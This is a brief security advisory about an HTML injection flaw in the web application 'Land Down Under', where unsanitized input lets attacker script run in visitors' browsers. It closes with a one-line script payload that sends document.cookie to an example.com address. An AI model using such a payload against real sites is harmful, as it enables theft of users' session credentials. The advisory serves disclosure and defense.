Land Down Under is prone to an HTML injection vulnerability.
This issue is due to a failure in the application to properly sanitize user-supplied input before using it in dynamically generated content.

Attacker-supplied HTML and script code would be executed in the context of the affected Web site, potentially allowing for theft of cookie-based authentication credentials. An attacker could also exploit this issue to control how the site is rendered to the user; other attacks are also possible.

<script>document.location="http://www.example.com/script?cookie="+escape(document.cookie)</script>
